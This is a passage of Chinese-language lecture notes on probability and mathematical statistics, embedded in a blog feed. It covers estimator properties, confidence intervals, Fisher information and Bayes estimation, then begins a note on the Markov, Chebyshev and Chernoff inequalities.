Var(\overline{X})=\dfrac{1}{n}\sigma^2,,Var(X_1)=\sigma^2,,Var\Big(\dfrac{1}{2}X_1+\dfrac{1}{2}X_2\Big)=\dfrac{1}{2}\sigma^2.<br>  $$</p></li><li><p><strong>注</strong>  有时也可称为“有效性准则”.</p></li><li><p><strong>定义</strong>  假定 $\hat\theta_0$ 为 $\theta$ 的无偏估计, 若对任意 $\theta$ 与 $\theta$ 的无偏估计 $\hat\theta$<br>  $$<br>  Var(\hat\theta_0)\le Var(\hat\theta)<br>  $$<br>  则称 $\hat\theta_0$ 为最小方差无偏估计 (<strong>MVUE</strong>).</p></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$.</p></li><li><p><strong>解答</strong>  由于<br>$$<br>E(m_2)=\dfrac{n-1}{n}\sigma^2,,E(S^2)=\sigma^2.<br>$$<br>因此计算可得<br>$$<br>E\Big[(m_2-\sigma^2)^2\Big]=\cdots&lt;E\Big[(S^2-\sigma^2)^2\Big]=\cdots<br>$$<br>这是用低偏差换了方差.</p></li><li><p><strong>定义</strong></p><ul><li>$\hat\theta=\hat\theta(X_1,\cdots,X_n)$ 的分布称为抽样分布;</li><li>$\hat\theta=\hat\theta(X_1,\cdots,X_n)$ 的标准差称为标准误差, 记为 $se(\hat\theta)$.</li></ul></li><li><p><strong>定义(大样本性质)</strong>  估计量 $\hat\theta$ 当 $n\rightarrow\theta$ 时的性质.</p></li><li><p><strong>定义(渐进无偏性)</strong>  有 $\lim\limits_{n\rightarrow\infty} E(\hat\theta-\theta)=0$;</p></li><li><p><strong>定义(相合性)</strong>  若 $\forall,\varepsilon&gt;0$, 有 $\lim\limits_{n\rightarrow\infty}P(\left|\hat\theta-\theta\right|\ge\varepsilon)=0$, 则称 $\hat\theta$ 为 $\theta$ 的一个相合估计, 即 $\hat\theta\stackrel{P}{\longrightarrow}\theta$.</p><ul><li><strong>WLLN</strong> $\Rightarrow$ $\overline{X}$ 是 $\mu$ 的一个相合估计;</li><li>相合性是良好点估计的自然要求.</li></ul></li><li><p><strong>例</strong>  我们得到<br>  $$<br>  \begin{aligned}<br>  m_2&amp;=\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2\<br>  &amp;=\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\mu-\overline{X}+\mu)^2\<br>  &amp;=\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\mu)^2-(\overline{X}-\mu)^2\<br>  &amp;\stackrel{P}{\rightarrow}E\Big[(X-\mu)^2\Big]\<br>  &amp;=\sigma^2.<br>  \end{aligned}<br>  $$<br>  进而有<br>  $$<br>  S^2=\dfrac{n}{n-1}m_2\stackrel{P}{\rightarrow}\sigma^2.<br>  $$</p></li><li><p><strong>定义(渐进正态性)</strong>  $\dfrac{\hat\theta-\theta}{se(\hat\theta)}\stackrel{d}{\rightarrow}Z\sim(0,1)$ (渐进正态估计).</p><ul><li><p>$\hat\theta\stackrel{近似}{\sim}N(0,se^2(\hat\theta))$;</p></li><li><p><strong>CLT</strong> $\Rightarrow\overline{X}$ 为 $\mu$ 的一个渐进正态估计, $se(\overline{X})=\dfrac{\sigma}{\sqrt{n}}$.</p></li></ul></li></ul><h2 id="置信区间-Condifence-Interval"><a href="#置信区间-Condifence-Interval" class="headerlink" title="置信区间 (Condifence Interval)"></a>置信区间 (Condifence Interval)</h2><ul><li><p><strong>定义(置信区间)</strong>  $\forall,\alpha\in(0,1)$, $\forall,\theta$, 有 $\hat\theta_i=\hat\theta_i(X_1,\cdots,X_n)$, 其中 $i=1,2$, 使得<br>  $$<br>  P(\hat\theta_1&lt;\theta&lt;\hat\theta_2)\ge 1-\alpha.<br>  $$<br>  则称 $(\hat\theta_1,\hat\theta_2)$ 为 $\theta$ 的 $(1-\alpha)$ 置信的区间估计 (双侧).</p></li><li><p><strong>注</strong></p><ul><li>$\alpha$ 通常取为 $0.05$, $0.01$, $0.1$;</li><li>置信 (水平、系数、度) 是针对方法的;</li><li>可靠性优先原则 (先保证 $P(\hat\theta_1&lt;\theta&lt;\hat\theta_2)\ge 1-\alpha$), 再尽量提升精度 (通常用 $E(\hat\theta_2-\hat\theta_1)$ 刻画).</li></ul></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, <strong>已知</strong> $\sigma^2$, 给出 $\mu$ 的 $(1-\alpha)$ 置信区间估计.</p></li><li><p><strong>解答</strong>  注意到<br>  $$<br>  \begin{aligned}<br>  &amp;\overline{X}-\mu\sim N(0,\dfrac{\sigma^2}{n})\<br>  \Longleftrightarrow&amp;\dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}\sim N(0,1)\<br>  \Longrightarrow&amp;P\Big(\left|\dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}\right|&lt;Z_{\tfrac{\alpha}{2}}\Big)=1-\alpha.<br>  \end{aligned}<br>  $$<br>  其中 $Z_{\tfrac{\alpha}{2}}$ 为 $N(0,1)$ 的上侧 $\dfrac{\alpha}{2}$ 分位数. 因此所求 $(1-\alpha)$ 置信的区间估计为<br>  $$<br>  (\overline{X}-\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}},\overline{X}+\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}}).<br>  $$</p></li><li><p><strong>注</strong></p><ul><li>若 $\alpha=0.05$, 则 $Z_{\tfrac{\alpha}{2}}=Z_{0.025}\approx 1.96\approx 2$;</li><li>若用 $\overline{X}$ 估计 $\mu$, 则有 $(1-\alpha)$ 置信, 误差绝对值 $\vert\overline{X}-\mu\vert\le\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}}$;</li><li>给定 $\varepsilon&gt;0$, 则 $n\ge\Big(\dfrac{Z_{\frac{\alpha}{2}}\sigma}{\varepsilon}\Big)^2$ 时, 有 $(1-\alpha)$ 置信, 误差绝对值 $\le\varepsilon$.</li></ul></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, <strong>未知</strong> $\sigma^2$, 给出 $\mu$ 的 $(1-\alpha)$ 置信区间估计.</p></li><li><p><strong>解答</strong>  注意到<br>  $$<br>  \dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}\sim N(0,1),\<br>  \dfrac{(n-1)S^2}{\sigma^2}\sim\chi^2(n-1).<br>  $$<br>  注意到 $\overline{X}$, $S^2$ 相互独立, 由**陈书 $P_{93-94}$**可得<br>  $$<br>  \dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}/\dfrac{S}{\sigma}\sim t(n-1).<br>  $$<br>  即<br>  $$<br>  \dfrac{\overline{X}-\mu}{\frac{S}{\sqrt{n}}}\sim t(n-1).<br>  $$<br>  因此<br>  $$<br>  P\Big(\left|\dfrac{\overline{X}-\mu}{\frac{S}{\sqrt{n}}}\right|&lt;t_{\tfrac{\alpha}{2}}(n-1)\Big)=1-\alpha.<br>  $$<br>  其中 $t_{\tfrac{\alpha}{2}}(n-1)$ 为 $t(n-1)$ 分布上侧 $\dfrac{\alpha}{2}$ 分位数, 所求 $(1-\alpha)$ 置信区间估计为<br>  $$<br>  (\overline{X}-\frac{S}{\sqrt{n}}t_{\tfrac{\alpha}{2}}(n-1),\overline{X}+\frac{S}{\sqrt{n}}t_{\tfrac{\alpha}{2}}(n-1)).<br>  $$</p></li><li><p><strong>注</strong>  $\dfrac{\overline{X}-\mu}{\frac{\sigma}{\sqrt{n}}}$, $\dfrac{\overline{X}-\mu}{\frac{S}{\sqrt{n}}}$ 成为枢轴变量.</p></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, <strong>未知</strong> $\mu$, 给出 $\sigma^2$ 的 $(1-\alpha)$ 置信区间估计.</p></li><li><p><strong>解答</strong>  注意到<br>  $$<br>  \dfrac{(n-1)S^2}{\sigma^2}\sim\chi^2(n-1).<br>  $$<br>  因此所求 $(1-\alpha)$ 置信区间估计为<br>  $$<br>  \Big(\frac{(n-1)S^2}{\chi^2_{\tfrac{\alpha}{2}}(n-1)},\frac{(n-1)S^2}{\chi^2_{1-\tfrac{\alpha}{2}}(n-1)}\Big).<br>  $$</p></li><li><p><strong>注</strong>  我们有<br>  $$<br>  \begin{aligned}<br>  \dfrac{(n-1)S^2}{\sigma^2}&amp;=\dfrac{\sum_{i=1}^{n}(X_i-\overline{X})^2}{\sigma^2}\<br>  &amp;=\sum\limits_{i=1}^{n}\Big(\dfrac{X_i-\mu}{\sigma}\Big)^2-\Big(\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}\Big)^2\<br>  &amp;\sim\chi^2(n-1).<br>  \end{aligned}<br>  $$</p></li><li><p><strong>例</strong>  $X\sim N(\mu_1,\sigma^2)$, $Y\sim N(\mu_2,\sigma^2)$ 相互独立, <strong>未知</strong> $\mu_1$, $\mu_2$, $\sigma^2$, 给出 $\mu_1-\mu_2$ 的 $(1-\alpha)$ 置信区间估计.</p></li><li><p><strong>解答</strong>  设 $X_1,\cdots,X_n$, $Y_1,\cdots,Y_m$ 为随机样本, $S_1^2$ 为 $X$ 的样本方差, $S_2^2$ 为 $Y$ 的样本方差, 则<br>  $$<br>  (\overline{X}-\overline{Y})-(\mu_1-\mu_2)\sim N(0,\dfrac{\sigma^2}{n}+\dfrac{\sigma^2}{m}).<br>  $$<br>  因为<br>  $$<br>  \dfrac{(n-1)S_1^2}{\sigma^2}+\dfrac{(m-1)S_2^2}{\sigma^2}\sim\chi^2(n+m-2).<br>  $$<br>  记<br>  $$<br>  S^2=\dfrac{n-1}{n+m-2}S_1^2+\dfrac{m-1}{n+m-2}S_2^2.<br>  $$<br>  从而得到<br>  $$<br>  \dfrac{(\overline{X}-\overline{Y})-(\mu_1-\mu_2)}{\sqrt{\dfrac{\sigma^2}{n}+\dfrac{\sigma^2}{m}}}/\dfrac{S}{\sigma}\sim t(n+m-2).<br>  $$<br>  也即<br>  $$<br>  \dfrac{(\overline{X}-\overline{Y})-(\mu_1-\mu_2)}{S\sqrt{\dfrac{1}{n}+\dfrac{1}{m}}}\sim t(n+m-2).<br>  $$<br>  这是我们用到的枢轴变量, 所求 $(1-\alpha)$ 置信区间估计为<br>  $$<br>  \Big(\overline{X}-\overline{Y}-t_{\tfrac{\alpha}{2}}(l)S\sqrt{\dfrac{m+n}{mn}},\overline{X}-\overline{Y}+t_{\tfrac{\alpha}{2}}(l)S\sqrt{\dfrac{m+n}{mn}}\Big).<br>  $$<br>  其中 $l=n+m-2$.</p></li><li><p><strong>定义(渐进置信区间)</strong>  通过大样本方法进行区间估计.</p></li><li><p><strong>例(选举问题)</strong>  真实支持率 $p$ 未知, $n=1200$, 观测比例 $\dfrac{684}{1200}\approx 0.57$. 给出 $p$ 的一个 $95%$ 置信的区间估计.</p></li><li><p><strong>解答</strong>  $X_i\sim B(p),(1\le i\le n)$ <strong>iid</strong> (近似有放回, $n&lt;&lt;N$). 我们有<br>  $$<br>  P_n=P_n(X_1,\cdots,X_n)=\dfrac{1}{n}\sum\limits_{i=1}^{n}X_i=\overline{X}.<br>  $$<br>  因此<br>  $$<br>  E(P_n)=p,,Var(P_n)=\dfrac{p(1-p)}{n}.<br>  $$<br>  由 <strong>CLT</strong>, 得到<br>  $$<br>  \dfrac{P_n-p}{\sqrt{\tfrac{p(1-p)}{n}}}\sim N(0,1)\Rightarrow P\Big(|\dfrac{P_n-p}{\sqrt{\tfrac{p(1-p)}{n}}}|&lt;Z_{\tfrac{\alpha}{2}}\Big)\approx 1-\alpha.<br>  $$<br>  $[1]$ 用 $S^2=\dfrac{1}{n-1}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2$ 来估计 $\sigma^2=p(1-p)$. 由 <strong>CLT</strong>, 得到<br>  $$<br>  \dfrac{P_n-p}{\sqrt{\tfrac{S^2}{n}}}\stackrel{近似} {\sim} N(0,1)\Rightarrow P\Big(|\dfrac{P_n-p}{\sqrt{\tfrac{S^2}{n}}}|&lt;Z_{\tfrac{\alpha}{2}}\Big)\approx 1-\alpha.<br>  $$<br>  其中 $S^2\approx 0.2475$, 区间估计为 $(0.542,0.598)$.</p><p>  $[2]$ 用 $m_2=\dfrac{1}{n}\sum\limits_{i=1}^{n}(X_i-\overline{X})^2$ 来估计 $\sigma^2=p(1-p)$. </p><p>  实际上, 我们有<br>  $$<br>  m_2=\dfrac{1}{n}[(1-P_n)^2nP_n+(0-P_n)^2(n-nP_n)]=P_n(1-P_n).<br>  $$<br>  由 <strong>CLT</strong>, 得到<br>  $$<br>  \dfrac{P_n-p}{\sqrt{\tfrac{P_n(1-P_n)}{n}}}\stackrel{近似} {\sim} N(0,1)\Rightarrow p\in(0.542,0.598).<br>  $$<br>  $[3]$ 用 $p(1-p)$ 的最大值来估计 $\sigma^2=p(1-p)$. 由 <strong>CLT</strong>, 得到<br>  $$<br>  \dfrac{P_n-p}{\sqrt{\tfrac{1}{4n}}}\stackrel{近似} {\sim} N(0,1)\Rightarrow p\in(0.542,0.599).<br>  $$</p></li><li><p><strong>注</strong>  近似分布情况下, 置信度 $\approx 1-\alpha$, 近似程度取决于 $n$ 及总体分布.</p></li><li><p><strong>定义(利用 MLE 构建置信区间)</strong></p><p>  总体分布 $f$ 满足一定的光滑性条件, 存在 $\sigma_n&gt;0$, 使 $\dfrac{\theta^{*}-\theta}{\sigma_n}\rightarrow N(0,1)$.</p></li><li><p><strong>定义(Fisher 信息量)</strong>  $X_1,\cdots,X_n$ <strong>iid</strong>, 其 <strong>PDF</strong> 为 $f(x;\theta)$. 定义对数似然函数<br>  $$<br>  l(\theta)=\log L(\theta)=\sum_{i=1}^{n}\log f(x_i;\theta).<br>  $$<br>  定义<br>  $$<br>  I_n(\theta)=E\Big[\big(\dfrac{\partial l(\theta)}{\partial\theta}\big)^2\Big]=E\Big[\big(\sum_{i=1}^{n}\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}\big)^2\Big].<br>  $$<br>  注意到<br>  $$<br>  \begin{aligned}<br>  E\Big(\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}\Big)&amp;=E\Big(\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}\Big)\<br>  &amp;=\int\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}f(X_i;\theta)dx\<br>  &amp;=\int f_{\theta}(X_i;\theta)dx\<br>  &amp;=\dfrac{d}{d\theta}\int f(X_i;\theta)dx=0.<br>  \end{aligned}<br>  $$<br>  因此<br>  $$<br>  \begin{aligned}<br>  \end{aligned}\begin{aligned}<br>  I_n(\theta)&amp;=E\Big[\big(\sum_{i=1}^{n}\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}\big)^2\Big]\<br>  &amp;=\sum_{i=1}^{n}E\Big[\big(\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}\big)^2\Big]\<br>  &amp;:=nI(\theta).<br>  \end{aligned}<br>  $$<br>  由极大似然估计的定义, 我们有<br>  $$<br>  0=l’(\theta^*)\approx l’(\theta)+(\theta^*-\theta)l’’(\theta)\Rightarrow\theta^*-\theta\approx \dfrac{l’(\theta)}{-l’’(\theta)}\<br>  \Rightarrow\sqrt{n}(\theta^*-\theta)\approx \dfrac{\tfrac{1}{\sqrt{n}}l’(\theta)}{-\tfrac{1}{n}l’’(\theta)}.<br>  $$<br>  研究上式<strong>分子</strong>: 设随机变量 $Y_i=\dfrac{\partial\log f(X_i;\theta)}{\partial\theta}=\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}$, 那么<br>  $$<br>  E(Y_i)=0,,Var(Y_i)=E(Y_i^2)-E^2(Y_i)=I(\theta).<br>  $$<br>  从而<br>  $$<br>  \dfrac{1}{\sqrt{n}}l’(\theta)=\dfrac{1}{\sqrt{n}}\sum_{i=1}^{n}Y_i=\dfrac{\overline{Y}}{\tfrac{1}{\sqrt{n}}}\stackrel{CLT}{\longrightarrow}N(0,I(\theta)).<br>  $$<br>  研究上式<strong>分母</strong>:<br>  $$<br>  -\dfrac{1}{n}l’’(\theta)=-\dfrac{1}{n}\sum_{i=1}^{n}\Big[\dfrac{f_{\theta\theta}(X_i;\theta)}{f(X_i;\theta)}-\big(\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}\big)^2\Big].<br>  $$<br>  注意到<br>  $$<br>  E\Big(\dfrac{f_{\theta\theta}(X_i;\theta)}{f(X_i;\theta)}\Big)=0.<br>  $$<br>  因此<br>  $$<br>  -\dfrac{1}{n}l’’(\theta)\stackrel{WLLN}{\longrightarrow}E\Big[\dfrac{1}{n}\sum_{i=1}^{n}\big(\dfrac{f_{\theta}(X_i;\theta)}{f(X_i;\theta)}\big)^2\Big]=\dfrac{1}{n}\sum_{i=1}^{n}E(Y_i^2)=I(\theta).<br>  $$<br>  结合上述讨论可得<br>  $$<br>  \sqrt{n}(\theta^*-\theta)\rightarrow N(0,\dfrac{1}{I(\theta)})\<br>  \Leftrightarrow\dfrac{\theta^*-\theta}{\tfrac{1}{\sqrt{nI(\theta)}}}\stackrel{近似}{\sim}N(0,1)\<br>  \Rightarrow\dfrac{\theta^*-\theta}{\tfrac{1}{\sqrt{nI(\theta^*)}}}\stackrel{近似}{\sim}N(0,1).<br>  $$<br>  这说明可以取 $\sigma_n=\dfrac{1}{\sqrt{nI(\theta)}}$ 或 $\dfrac{1}{\sqrt{nI(\theta^*)}}$.</p></li><li><p><strong>例(选举问题)</strong>  真实支持率 $p$ 未知, $n=1200$, 观测比例 $\dfrac{684}{1200}\approx 0.57$. 给出 $p$ 的一个 $95%$ 置信的区间估计.</p></li><li><p><strong>解答续</strong>  注意到 $X_i\stackrel{iid}{\sim}B(p)$, $p$ 的 <strong>MLE</strong> 为 $p^{<em>}=P_n$. 有似然函数<br>  $$<br>  f(X;p)=p^{X}(1-p)^{1-X}\Rightarrow \dfrac{\partial\log f}{\partial p}=\dfrac{X-p}{p(1-p)}.<br>  $$<br>  <strong>Fisher</strong> 信息量为:<br>  $$<br>  I(p)=E\Big[\big(\dfrac{X-p}{p(1-p)}\big)^2\Big]=\dfrac{1}{p(1-p)}.<br>  $$<br>  得到 $\sigma_n=\dfrac{1}{\sqrt{p(1-p)}}$ 或 $\dfrac{1}{\sqrt{p^{</em>}(1-p^{*})}}$. 这与前例 $[2]$ 完全一致.</p></li><li><p><strong>例(两总体)</strong>  $X\sim N(\mu_1,\sigma_1^2)$, $Y\sim N(\mu_2,\sigma_2^2)$ 独立, 参数未知. 估计 $\mu_1-\mu_2$.</p></li><li><p><strong>解答</strong>  得到<br>  $$<br>  \dfrac{(\overline{X}-\overline{Y})-(\mu_1-\mu_2)}{\sqrt{\dfrac{\sigma_1^2}{n}+\dfrac{\sigma_2^2}{m}}}\sim N(0,1).<br>  $$<br>  因此<br>  $$<br>  \dfrac{(\overline{X}-\overline{Y})-(\mu_1-\mu_2)}{\sqrt{\dfrac{S_1^2}{n}+\dfrac{S_2^2}{m}}}\stackrel{近似}{\sim} N(0,1).<br>  $$</p></li></ul><h2 id="Bayes-估计"><a href="#Bayes-估计" class="headerlink" title="Bayes 估计"></a>Bayes 估计</h2><ul><li><p><strong>定义(Bayes 估计)</strong></p><ul><li><p>在搜集数据之前, 对参数 $\theta$ 有先验知识, 可用一个概率分布来刻画 (先验分布).</p></li><li><p>$\Theta$ — 随机变量, $\theta$ —  $\Theta$ 的实现值.</p></li><li><p>$X$ — 试验观测, $x$ — 具体观测结果.</p></li><li><p>$f_{\Theta}(\theta)$ — 先验分布, $f_{X\mid\Theta}(x\mid\theta)=f_X(x,\theta)$ — 搜集的样本分布.</p></li><li><p>更新先验分布为后验分布:<br>  $$<br>  f_{\Theta\mid X}(\theta\mid x)=\dfrac{f(x,\theta)}{f_X(x)}=\dfrac{f_{X\mid\Theta}(x\mid\theta)f_{\Theta}(\theta)}{f_X(x)}.<br>  $$<br>  其中<br>  $$<br>  f_X(x)=\int_{\mathbb{R}}f(x,\theta)d\theta.<br>  $$<br>  可通过后验期望或后验众数得到 <strong>Bayes</strong> 估计值.</p></li></ul></li><li><p><strong>例</strong>  投掷硬币, 正面向上的概率为 $\theta$ (未知). 抛 $n$ 次观测到 $x$ 次正面向上.</p></li><li><p><strong>解答</strong>  对 $\theta$ 的先验认知: $\theta\sim U(0,1)$ (<strong>Bayes</strong> 法则). 此时有 $f_{\Theta}(\theta)=1$, $\theta\in(0,1)$.</p><p>  令 $X=n$ 次试验正面向上的次数, 给定 $\theta$ 时, $X\sim B(n,\theta)$. 即<br>  $$<br>  f_{X\mid\Theta}(x\mid\theta)=P(X=x\mid \Theta=\theta)=C_n^x\theta^x(1-\theta)^{n-x},x=0,1,\cdots, n.<br>  $$<br>  故 $(X,\Theta)$ 的联合分布为<br>  $$<br>  f(x,\theta)=C_n^x\theta^x(1-\theta)^{n-x},\theta\in(0,1),x=0,1,\cdots, n.<br>  $$<br>  得到<br>  $$<br>  f_X(x)=\int_0^1f(x,\theta)d\theta=C_n^x\int_0^1\theta^x(1-\theta)^{n-x}d\theta\<br>  =\dfrac{n!}{x!(n-x)!}\cdot\dfrac{\Gamma(x+1)\Gamma(n-x+1)}{\Gamma(n+2)}=\dfrac{1}{n+1}<br>  $$<br>  进而<br>  $$<br>  f_{\Theta\mid X}(\theta\mid x)=\dfrac{f(x,\theta)}{f_X(x)}=\dfrac{\Gamma(n+2)}{\Gamma(x+1)\Gamma(n-x+1)}\cdot\theta^x(1-\theta)^{n-x}.<br>  $$<br>  注意到这恰好为 $\beta(x+1,n-x+1)$ 的 <strong>PDF</strong>.</p><p>  <strong>后验均值</strong>估计值为<br>  $$<br>  \hat\theta=E(\Theta\mid X)=\int_0^1\theta f_{\Theta\mid X}(\theta\mid x)d\theta=\dfrac{x+1}{n+2}.<br>  $$<br>  <strong>后验众数</strong>估计值为 $f_{\Theta\mid X}(\theta\mid x)$ 的最大值点<br>  $$<br>  \theta^{*}=\dfrac{x}{n}.<br>  $$</p></li><li><p><strong>注</strong>  </p><ul><li>若 $n=20$, $x=13$, 后验分布服从 $\beta(14,8)$.</li><li>此时 $P(\Theta&gt;\dfrac{1}{2})\approx 0.91$, 而 $\Theta&lt;\dfrac{1}{4}$ 基本不可能.</li></ul></li><li><p><strong>注(合理的点估计)</strong></p><ul><li>后验众数;</li><li>后验均值.</li></ul></li><li><p><strong>注(先验分布选取)</strong> </p><ul><li>本问题先验分布服从 $U(0,1)=\beta(1,1)$, 后验分布服从 $\beta(x+1,n-x+1)$;</li><li>一般地, 先验分布服从 $\beta(a,b)$, 后验分布服从 $\beta(a+x,b+n-x)$.</li></ul></li><li><p><strong>定义(Bayes 区间估计)</strong>  得到参数 $\theta$ 的后验分布 $f_{\Theta}(\theta\mid x)$, 给定观测值 $x$ 和实数 $\alpha\in(0,1)$, 若对参数 $\theta$ 的任意可能取值, 都成立<br>  $$<br>  P(a&lt;\Theta&lt;b\mid x)\ge 1-\alpha.<br>  $$<br>  则称 $(a,b)$ 为 $\theta$ 的 $(1−\alpha)$ 置信的 <strong>Bayes</strong> 区间估计.</p></li><li><p><strong>注</strong></p><ul><li>最大后验区间 (一般单峰);</li><li>等尾可信区间.</li></ul></li><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, $\sigma^2$ 已知, 给出 $\mu$ 的 $(1-\alpha)$ 置信的 <strong>Bayes</strong> 区间估计.</p></li><li><p><strong>解答</strong>  取 $\mu$ 的先验分布 $f(\mu)\propto 1$, 有后验分布为 $N(\overline{X},\dfrac{\sigma^2}{n})$.</p><p>  进一步可得<br>  $$<br>  \dfrac{\mu-\overline{X}}{\tfrac{\sigma}{\sqrt{n}}}\sim N(0,1).<br>  $$<br>  得到所求 <strong>Bayes</strong> 估计区间为<br>  $$<br>  (\overline{X}-\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}},\overline{X}+\frac{\sigma}{\sqrt{n}}Z_{\tfrac{\alpha}{2}}).<br>  $$</p></li></ul><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><h3 id="样本"><a href="#样本" class="headerlink" title="样本"></a>样本</h3><ul><li>$X_1,\cdots,X_n$ 为样本, 通常为 <strong>iid</strong>.</li><li>$\hat\theta=\hat\theta(X_1,\cdots,X_n)$ 为统计量.</li><li>样本分布: $f(x_1,\cdots,x_n;\theta)$ (<strong>PDF</strong>\<strong>PMF</strong>).</li><li>抽样分布: $\hat\theta$ 的分布.</li><li>标准误差: $se=se(\hat\theta)=\sqrt{Var(\hat\theta)}$.</li></ul><h3 id="经典估计的优良性"><a href="#经典估计的优良性" class="headerlink" title="经典估计的优良性"></a>经典估计的优良性</h3><ul><li>$n$ 固定: 无偏性 &amp; 有效性 (<strong>MSE</strong> 的分解)</li><li>$n\rightarrow\infty$: 渐近无偏 &amp; 相合性 (<strong>WLLN</strong> 一致性) &amp; 渐近正态性 (<strong>CLT</strong>)</li></ul><h3 id="置信区间"><a href="#置信区间" class="headerlink" title="置信区间"></a>置信区间</h3><ul><li>$\hat\theta_i=\hat\theta_i(X_1,\cdots,X_n),(i=1,2)$.</li><li>$P(\hat\theta_1&lt;\theta&lt;\hat\theta_2)\ge 1-\alpha$.</li><li>置信 (水平、系数、度) 是针对方法.</li><li>枢轴变量: $H(\hat\theta,\theta)$ 表示分布可用.</li></ul><h3 id="置信区间-v-s-Bayes-区间"><a href="#置信区间-v-s-Bayes-区间" class="headerlink" title="置信区间 v.s. Bayes 区间"></a>置信区间 v.s. Bayes 区间</h3><ul><li><p>(置信区间) 对具体的样本观测值 $(x_1,\cdots,x_n)$, 代入 $\hat\theta_1, \hat\theta_2$ 得到具体区间.<br>  $$<br>  P(\hat\theta_1&lt;\theta&lt;\hat\theta_2)\ge 1-\alpha.<br>  $$</p></li><li><p>(<strong>Bayes</strong> 区间) 对具体的样本观测值 $(x_1,\cdots,x_n)$, 代入 $a, b$ 得到具体区间.<br>  $$<br>  P(a&lt;\Theta&lt;b\mid x_1,\cdots,x_n)\ge 1-\alpha.<br>  $$</p></li></ul><h3 id="小样本方法-v-s-大样本方法"><a href="#小样本方法-v-s-大样本方法" class="headerlink" title="小样本方法 v.s. 大样本方法"></a>小样本方法 v.s. 大样本方法</h3><ul><li>精确分布 <strong>v.s.</strong> 近似分布</li></ul><h3 id="Fisher-信息量"><a href="#Fisher-信息量" class="headerlink" title="Fisher 信息量"></a>Fisher 信息量</h3><p>$$<br>\dfrac{\theta^*-\theta}{\sigma_n}\stackrel{近似}{\sim}N(0,1).<br>$$</p><p>$$<br>\sigma_n=\sqrt{\dfrac{1}{nI(\theta)}}或\sqrt{\dfrac{1}{nI(\theta^*)}}.<br>$$</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记5</title>
      <link href="/50/"/>
      <url>/50/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-5-不等式与极限定理"><a href="#Chap-5-不等式与极限定理" class="headerlink" title="Chap 5 不等式与极限定理"></a>Chap 5 不等式与极限定理</h1><h2 id="概率不等式"><a href="#概率不等式" class="headerlink" title="概率不等式"></a>概率不等式</h2><ul><li><p><strong>定义(Markov 不等式)</strong>  $Y\ge 0$, $\forall,a&gt;0$, 有<br>$$<br>P(Y\ge a)\le \dfrac{E(Y)}{a}.<br>$$</p></li><li><p><strong>证明</strong>  令示性变量<br>$$<br>I=<br>\begin{cases}<br>1,Y\ge a;\<br>0,Y&lt;a.<br>\end{cases}<br>$$<br>从而有 $I\le \dfrac{Y}{a}$, 两边取期望, 即得<br>$$<br>P(Y\ge a)\le \dfrac{E(Y)}{a}.<br>$$</p></li><li><p><strong>定义(Chebyshev 不等式)</strong>  $Var(Y)$ 存在, $\forall,a&gt;0$, 有<br>$$<br>P(\vert Y-E(Y)\vert\ge a)\le \dfrac{Var(Y)}{a^2}.<br>$$</p></li><li><p><strong>证明</strong>  注意到<br>  $$<br>  \begin{aligned}<br>  P(\vert Y-E(Y)\vert\ge a)&amp;=P((Y-E(Y))^2\ge a^2)\<br>  &amp;\le\dfrac{E[(Y-E(Y))^2]}{a^2}\<br>  &amp;=\dfrac{Var(Y)}{a^2}.<br>  \end{aligned}<br>  $$</p></li><li><p><strong>注</strong>  若 $Var(Y)=0$, 则 $P(Y=E(Y))=1$. ($Y=E(Y)$ $a.s.$)</p></li><li><p><strong>定义(Chernoff 不等式)</strong>  $\forall,a&gt;0$, $t&gt;0$, 有<br>$$<br>P(Y\ge a)\le \dfrac{E(e^{tY})}{e^{ta}}.<br>$$</p></li><li><p><strong>证明</strong>  注意到<br>  $$<br>  \begin{aligned}<br>  P(Y\ge a)&amp;=P(e^{tY}\ge e^{ta}),(保证,e^{tY}&gt;0)\<br>  &amp;\le\dfrac{E(e^{tY})}{e^{ta}}.<br>  \end{aligned}<br>  $$</p></li><li><p><strong>例</strong>  $X\sim N(0,1)$, 估计 $P(\vert X\vert\ge 3)$.</p></li><li><p><strong>解答</strong>  我们有<br>  $$<br>  P(\vert X\vert\ge 3)\le<br>  \begin{cases}<br>  \dfrac{E(\vert X\vert)}{3}=\dfrac{1}{3}\sqrt{\dfrac{2}{\pi}}\approx 0.27;\quad(Markov)\<br>  \dfrac{Var(X)}{3^2}=\dfrac{1}{9}\approx 0.11;\quad(Chebyshev)\<br>  \dfrac{2E(e^{tX})}{e^{3t}}=2e^{\tfrac{t^2}{2}-3t}\le 2e^{-\tfrac{9}{2}}\approx 0.02.\quad(Chernoff)<br>  \end{cases}<br>  $$</p></li></ul><h2 id="大数定律-LLN"><a href="#大数定律-LLN" class="headerlink" title="大数定律 (LLN)"></a>大数定律 